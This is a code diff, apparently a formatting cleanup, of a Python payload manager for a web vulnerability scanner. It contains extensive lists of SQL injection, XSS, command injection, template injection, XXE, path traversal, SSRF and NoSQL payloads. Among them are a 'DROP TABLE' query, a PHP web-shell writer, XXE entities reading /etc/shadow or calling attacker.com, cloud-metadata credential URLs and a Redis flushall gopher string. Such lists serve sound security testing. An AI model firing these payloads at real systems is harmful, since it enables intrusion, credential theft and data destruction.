@@ -4,58 +4,61 @@ Payload 管理器
 集中管理各类漏洞检测的 payload，支持分类、编码变体和自定义加载
 """
 
-from typing import List, Dict, Optional, Iterator, Set
-from dataclasses import dataclass, field
-from enum import Enum
 import base64
-import urllib.parse
 import html
+import json
 import logging
 import os
-import json
+import urllib.parse
+from dataclasses import dataclass, field
+from enum import Enum
+from typing import Dict, Iterator, List, Optional, Set
 
 logger = logging.getLogger(__name__)
 
 
 class PayloadCategory(Enum):
     """Payload 类别枚举"""
-    SQLI = 'sqli'                    # SQL 注入
-    XSS = 'xss'                      # 跨站脚本
-    RCE = 'rce'                      # 命令注入
-    SSTI = 'ssti'                    # 模板注入
-    XXE = 'xxe'                      # XML 外部实体
-    PATH_TRAVERSAL = 'path_traversal'  # 路径遍历
-    SSRF = 'ssrf'                    # 服务端请求伪造
-    LDAP = 'ldap'                    # LDAP 注入
-    NOSQL = 'nosql'                  # NoSQL 注入
-    IDOR = 'idor'                    # 不安全的直接对象引用
-    OPEN_REDIRECT = 'open_redirect'  # 开放重定向
-    CRLF = 'crlf'                    # CRLF 注入
-    HEADER = 'header'                # HTTP 头注入
-    LFI = 'lfi'                      # 本地文件包含
-    FILE_UPLOAD = 'file_upload'      # 文件上传
+
+    SQLI = "sqli"  # SQL 注入
+    XSS = "xss"  # 跨站脚本
+    RCE = "rce"  # 命令注入
+    SSTI = "ssti"  # 模板注入
+    XXE = "xxe"  # XML 外部实体
+    PATH_TRAVERSAL = "path_traversal"  # 路径遍历
+    SSRF = "ssrf"  # 服务端请求伪造
+    LDAP = "ldap"  # LDAP 注入
+    NOSQL = "nosql"  # NoSQL 注入
+    IDOR = "idor"  # 不安全的直接对象引用
+    OPEN_REDIRECT = "open_redirect"  # 开放重定向
+    CRLF = "crlf"  # CRLF 注入
+    HEADER = "header"  # HTTP 头注入
+    LFI = "lfi"  # 本地文件包含
+    FILE_UPLOAD = "file_upload"  # 文件上传
 
 
 class EncodingType(Enum):
     """编码类型"""
-    RAW = 'raw'              # 原始
-    URL = 'url'              # URL 编码
-    DOUBLE_URL = 'double_url'  # 双重 URL 编码
-    HTML = 'html'            # HTML 实体编码
-    BASE64 = 'base64'        # Base64 编码
-    UNICODE = 'unicode'      # Unicode 编码
-    HEX = 'hex'              # 十六进制编码
+
+    RAW = "raw"  # 原始
+    URL = "url"  # URL 编码
+    DOUBLE_URL = "double_url"  # 双重 URL 编码
+    HTML = "html"  # HTML 实体编码
+    BASE64 = "base64"  # Base64 编码
+    UNICODE = "unicode"  # Unicode 编码
+    HEX = "hex"  # 十六进制编码
 
 
 @dataclass
 class Payload:
     """Payload 定义"""
-    value: str                              # payload 值
-    category: PayloadCategory               # 类别
-    name: Optional[str] = None              # 名称
-    description: Optional[str] = None       # 描述
+
+    value: str  # payload 值
+    category: PayloadCategory  # 类别
+    name: Optional[str] = None  # 名称
+    description: Optional[str] = None  # 描述
     tags: List[str] = field(default_factory=list)  # 标签
-    severity: str = 'medium'                # 严重程度
+    severity: str = "medium"  # 严重程度
     encoded_variants: List[str] = field(default_factory=list)  # 预计算的编码变体
 
     def __post_init__(self):
@@ -80,17 +83,17 @@ class PayloadEncoder:
         if encoding == EncodingType.RAW:
             return payload
         elif encoding == EncodingType.URL:
-            return urllib.parse.quote(payload, safe='')
+            return urllib.parse.quote(payload, safe="")
         elif encoding == EncodingType.DOUBLE_URL:
-            return urllib.parse.quote(urllib.parse.quote(payload, safe=''), safe='')
+            return urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe="")
         elif encoding == EncodingType.HTML:
             return html.escape(payload)
         elif encoding == EncodingType.BASE64:
             return base64.b64encode(payload.encode()).decode()
         elif encoding == EncodingType.UNICODE:
-            return ''.join(f'\\u{ord(c):04x}' for c in payload)
+            return "".join(f"\\u{ord(c):04x}" for c in payload)
         elif encoding == EncodingType.HEX:
-            return ''.join(f'%{ord(c):02x}' for c in payload)
+            return "".join(f"%{ord(c):02x}" for c in payload)
         else:
             return payload
 
@@ -126,43 +129,39 @@ class PayloadEncoder:
 SQLI_PAYLOADS = [
     # 基础探测
     "'",
-    "\"",
+    '"',
     "'--",
-    "\"--",
+    '"--',
     "1'",
-    "1\"",
-
+    '1"',
     # OR 注入
     "' OR '1'='1",
     "' OR '1'='1'--",
     "' OR '1'='1'/*",
     "' OR '1'='1'#",
-    "\" OR \"1\"=\"1",
-    "\" OR \"1\"=\"1\"--",
+    '" OR "1"="1',
+    '" OR "1"="1"--',
     "1' OR '1'='1",
-    "1\" OR \"1\"=\"1",
+    '1" OR "1"="1',
     "' OR 1=1--",
-    "\" OR 1=1--",
+    '" OR 1=1--',
     "or 1=1--",
     "' or ''='",
-    "\" or \"\"=\"",
-
+    '" or ""="',
     # AND 注入
     "1' AND '1'='1",
     "1' AND '1'='2",
     "1 AND 1=1",
     "1 AND 1=2",
-
     # 时间盲注
     "' AND SLEEP(5)--",
     "1' AND SLEEP(5)--",
-    "\" AND SLEEP(5)--",
+    '" AND SLEEP(5)--',
     "'; WAITFOR DELAY '0:0:5'--",
     "1; WAITFOR DELAY '0:0:5'--",
     "' AND BENCHMARK(5000000,SHA1('test'))--",
     "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
     "1' AND pg_sleep(5)--",
-
     # UNION 注入
     "' UNION SELECT NULL--",
     "' UNION SELECT NULL,NULL--",
@@ -173,24 +172,20 @@ SQLI_PAYLOADS = [
     "1' UNION SELECT 1,2,3--",
     "' UNION ALL SELECT NULL--",
     "' UNION ALL SELECT 1,2,3--",
-
     # ORDER BY 探测列数
     "1' ORDER BY 1--",
     "1' ORDER BY 2--",
     "1' ORDER BY 3--",
     "1' ORDER BY 10--",
     "1' ORDER BY 100--",
-
     # 报错注入
     "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
     "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)--",
     "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
-
     # 堆叠查询
     "'; SELECT SLEEP(5);--",
     "'; DROP TABLE users;--",
     "'; INSERT INTO users VALUES('hacked','hacked');--",
-
     # 特殊字符
     "1/**/AND/**/1=1",
     "1'/**/AND/**/1=1--",
@@ -205,7 +200,6 @@ XSS_PAYLOADS = [
     "<script>alert('XSS')</script>",
     "<script>alert(document.domain)</script>",
     "<script>alert(document.cookie)</script>",
-
     # 事件处理器
     "<img src=x onerror=alert(1)>",
     "<img src=x onerror=alert('XSS')>",
@@ -223,43 +217,35 @@ XSS_PAYLOADS = [
     "<iframe onload=alert(1)>",
     "<object data=javascript:alert(1)>",
     "<embed src=javascript:alert(1)>",
-
     # JavaScript 协议
     "javascript:alert(1)",
     "javascript:alert('XSS')",
     "javascript:alert(document.domain)",
-
     # 属性注入
-    "\" onmouseover=\"alert(1)",
+    '" onmouseover="alert(1)',
     "' onmouseover='alert(1)",
-    "\" onfocus=\"alert(1)\" autofocus=\"",
+    '" onfocus="alert(1)" autofocus="',
     "' onfocus='alert(1)' autofocus='",
-
     # 标签闭合
     "'><script>alert(1)</script>",
-    "\"><script>alert(1)</script>",
+    '"><script>alert(1)</script>',
     "</title><script>alert(1)</script>",
     "</textarea><script>alert(1)</script>",
     "--><script>alert(1)</script>",
     "]]><script>alert(1)</script>",
-
     # 大小写混淆
     "<ScRiPt>alert(1)</sCrIpT>",
     "<IMG SRC=x onerror=alert(1)>",
     "<SVG ONLOAD=alert(1)>",
-
     # 空字符绕过
     "<scr\x00ipt>alert(1)</script>",
     "<img src=x one\x00rror=alert(1)>",
-
     # 编码绕过
     "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>",
     "<svg onload=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>",
-
     # DOM XSS
     "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
     "<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
-
     # 特殊标签
     "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
     "<svg><desc><template><frameset><iframe srcdoc='<script>alert(1)</script>'>",
@@ -282,7 +268,6 @@ RCE_PAYLOADS = [
     "&& whoami",
     "`whoami`",
     "$(whoami)",
-
     # 管道和重定向
     "; cat /etc/passwd",
     "| cat /etc/passwd",
@@ -292,7 +277,6 @@ RCE_PAYLOADS = [
     "| ls -la",
     "; pwd",
     "| pwd",
-
     # 命令分隔
     "; sleep 5",
     "| sleep 5",
@@ -301,7 +285,6 @@ RCE_PAYLOADS = [
     "&& sleep 5",
     "`sleep 5`",
     "$(sleep 5)",
-
     # Windows 命令
     "& dir",
     "| dir",
@@ -313,25 +296,22 @@ RCE_PAYLOADS = [
     "& ping -n 5 127.0.0.1",
     "| ping -n 5 127.0.0.1",
     "& timeout /t 5",
-
     # 换行符
     "\n id",
     "\r\n id",
     "%0a id",
     "%0d%0a id",
-
     # 空格绕过
     ";{id}",
     ";$IFS$9id",
     ";${IFS}id",
     "<id",
     ">id",
-
     # 引号逃逸
     "';id;'",
-    "\";id;\"",
+    '";id;"',
     "';id;#",
-    "\";id;#",
+    '";id;#',
 ]
 
 # SSTI Payload
@@ -343,7 +323,6 @@ SSTI_PAYLOADS = [
     "<%= 7*7 %>",
     "{{7*'7'}}",
     "${7*'7'}",
-
     # Jinja2 (Python)
     "{{config}}",
     "{{self.__class__}}",
@@ -353,30 +332,23 @@ SSTI_PAYLOADS = [
     "{{lipsum.__globals__['os'].popen('id').read()}}",
     "{{cycler.__init__.__globals__.os.popen('id').read()}}",
     "{%for x in ().__class__.__base__.__subclasses__()%}{%if 'warning' in x.__name__%}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{%endif%}{%endfor%}",
-
     # Twig (PHP)
     "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
     "{{['id']|filter('system')}}",
     "{{app.request.server.all|join(',')}}",
-
     # Freemarker (Java)
-    "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
-    "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
-
+    '${"freemarker.template.utility.Execute"?new()("id")}',
+    '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
     # Velocity (Java)
     "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end",
-
     # Smarty (PHP)
     "{php}echo `id`;{/php}",
     "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['cmd']); ?>\",self::clearConfig())}",
-
     # Pebble (Java)
     "{% set cmd = 'id' %}{{ 'a]'.class.forName('java.lang.Runtime').getMethod('exec',[String.class]).invoke('a]'.class.forName('java.lang.Runtime').getMethod('getRuntime',[]).invoke(null),[cmd]).inputStream.text }}",
-
     # Mako (Python)
     "${self.module.cache.util.os.system('id')}",
     "${self.module.runtime.util.os.system('id')}",
-
     # Thymeleaf (Java)
     "__${T(java.lang.Runtime).getRuntime().exec('id')}__::.",
     "*{T(java.lang.Runtime).getRuntime().exec('id')}",
@@ -388,26 +360,19 @@ XXE_PAYLOADS = [
     '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
     '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
     '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
-
     # 参数实体
     '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">%xxe;]><foo></foo>',
-
     # 外部 DTD
     '<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://attacker.com/xxe.dtd"><foo></foo>',
-
     # SSRF via XXE
     '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
     '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:22">]><foo>&xxe;</foo>',
-
     # Blind XXE (OOB)
     '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe">%xxe;]><foo></foo>',
-
     # XInclude
     '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>',
-
     # SVG XXE
     '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>',
-
     # 编码绕过
     '<?xml version="1.0" encoding="UTF-16BE"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
 ]
@@ -421,7 +386,6 @@ PATH_TRAVERSAL_PAYLOADS = [
     "..\\..\\..\\",
     "....//",
     "....\\\\",
-
     # 读取敏感文件
     "../../../etc/passwd",
     "../../../etc/shadow",
@@ -429,24 +393,20 @@ PATH_TRAVERSAL_PAYLOADS = [
     "..\\..\\..\\windows\\system32\\config\\sam",
     "../../../etc/hosts",
     "../../../proc/self/environ",
-
     # 编码绕过
     "..%2f..%2f..%2fetc%2fpasswd",
     "..%5c..%5c..%5cwindows%5cwin.ini",
     "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
     "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
     "..%252f..%252f..%252fetc%252fpasswd",
-
     # 空字节截断
     "../../../etc/passwd%00",
     "../../../etc/passwd%00.jpg",
     "..\\..\\..\\windows\\win.ini%00",
     "..\\..\\..\\windows\\win.ini%00.jpg",
-
     # 点过滤绕过
     "....//....//....//etc/passwd",
     "..../..../..../etc/passwd",
-
     # 绝对路径
     "/etc/passwd",
     "c:\\windows\\win.ini",
@@ -464,27 +424,22 @@ SSRF_PAYLOADS = [
     "http://127.0.0.1:6379",
     "http://0.0.0.0",
     "http://0",
-
     # 内网 IP 段
     "http://10.0.0.1",
     "http://172.16.0.1",
     "http://192.168.0.1",
     "http://192.168.1.1",
-
     # 云元数据
     "http://169.254.169.254/latest/meta-data/",
     "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
     "http://metadata.google.internal/computeMetadata/v1/",
     "http://100.100.100.200/latest/meta-data/",
-
     # 协议绕过
     "file:///etc/passwd",
     "dict://127.0.0.1:11211/info",
     "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a",
-
     # DNS Rebinding
     "http://attacker.com.127.0.0.1.nip.io",
-
     # 编码绕过
     "http://127.1",
     "http://2130706433",  # 127.0.0.1 的十进制
@@ -492,7 +447,6 @@ SSRF_PAYLOADS = [
     "http://0177.0.0.1",  # 127.0.0.1 的八进制
     "http://[::1]",  # IPv6 本地回环
     "http://[0:0:0:0:0:ffff:127.0.0.1]",
-
     # 重定向绕过
     "http://attacker.com/redirect?url=http://169.254.169.254",
 ]
@@ -523,10 +477,9 @@ NOSQL_PAYLOADS = [
     '{"$regex": ".*"}',
     '{"$where": "1==1"}',
     '{"$or": [{}]}',
-    '[$gt]=',
-    '[$ne]=',
+    "[$gt]=",
+    "[$ne]=",
     '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
-
     # JavaScript 注入
     "'; return true; var dummy='",
     "'; return this.password; var dummy='",
@@ -638,16 +591,13 @@ class PayloadManager:
         }
 
         for category, values in defaults.items():
-            self._payloads[category] = [
-                Payload(value=v, category=category)
-                for v in values
-            ]
+            self._payloads[category] = [Payload(value=v, category=category) for v in values]
 
     def get(
         self,
         category: PayloadCategory,
         limit: Optional[int] = None,
-        tags: Optional[List[str]] = None
+        tags: Optional[List[str]] = None,
     ) -> List[str]:
         """获取指定类别的 payload
 
@@ -674,11 +624,7 @@ class PayloadManager:
 
         return values
 
-    def get_payloads(
-        self,
-        category: PayloadCategory,
-        limit: Optional[int] = None
-    ) -> List[Payload]:
+    def get_payloads(self, category: PayloadCategory, limit: Optional[int] = None) -> List[Payload]:
         """获取 Payload 对象列表
 
         Args:
@@ -699,7 +645,7 @@ class PayloadManager:
         self,
         category: PayloadCategory,
         encodings: Optional[List[EncodingType]] = None,
-        limit: Optional[int] = None
+        limit: Optional[int] = None,
     ) -> Iterator[str]:
         """获取 payload 及其编码变体
 
@@ -768,11 +714,11 @@ class PayloadManager:
             return 0
 
         try:
-            with open(path, 'r', encoding='utf-8') as f:
+            with open(path, "r", encoding="utf-8") as f:
                 content = f.read().strip()
 
                 # 尝试 JSON 格式
-                if content.startswith('[') or content.startswith('{'):
+                if content.startswith("[") or content.startswith("{"):
                     data = json.loads(content)
                     if isinstance(data, list):
                         for item in data:
@@ -780,19 +726,21 @@ class PayloadManager:
                                 self.add(Payload(value=item, category=category))
                                 count += 1
                             elif isinstance(item, dict):
-                                self.add(Payload(
-                                    value=item.get('value', ''),
-                                    category=category,
-                                    name=item.get('name'),
-                                    description=item.get('description'),
-                                    tags=item.get('tags', [])
-                                ))
+                                self.add(
+                                    Payload(
+                                        value=item.get("value", ""),
+                                        category=category,
+                                        name=item.get("name"),
+                                        description=item.get("description"),
+                                        tags=item.get("tags", []),
+                                    )
+                                )
                                 count += 1
                 else:
                     # 逐行读取
-                    for line in content.split('\n'):
+                    for line in content.split("\n"):
                         line = line.strip()
-                        if line and not line.startswith('#'):
+                        if line and not line.startswith("#"):
                             self.add(Payload(value=line, category=category))
                             count += 1
 
@@ -816,9 +764,9 @@ class PayloadManager:
         count = len(payloads)
 
         try:
-            with open(path, 'w', encoding='utf-8') as f:
+            with open(path, "w", encoding="utf-8") as f:
                 for payload in payloads:
-                    f.write(payload + '\n')
+                    f.write(payload + "\n")
             logger.info(f"导出 {count} 个 payload 到 {path}")
         except Exception as e:
             logger.error(f"导出 payload 失败: {e}")
@@ -864,10 +812,7 @@ def get_payload_manager() -> PayloadManager:
     return _manager
 
 
-def get_payloads(
-    category: PayloadCategory,
-    limit: Optional[int] = None
-) -> List[str]:
+def get_payloads(category: PayloadCategory, limit: Optional[int] = None) -> List[str]:
     """获取指定类别的 payload（便捷函数）
 
     Args:
@@ -883,7 +828,7 @@ def get_payloads(
 def get_payloads_with_variants(
     category: PayloadCategory,
     encodings: Optional[List[EncodingType]] = None,
-    limit: Optional[int] = None
+    limit: Optional[int] = None,
 ) -> List[str]:
     """获取 payload 及其编码变体（便捷函数）
 
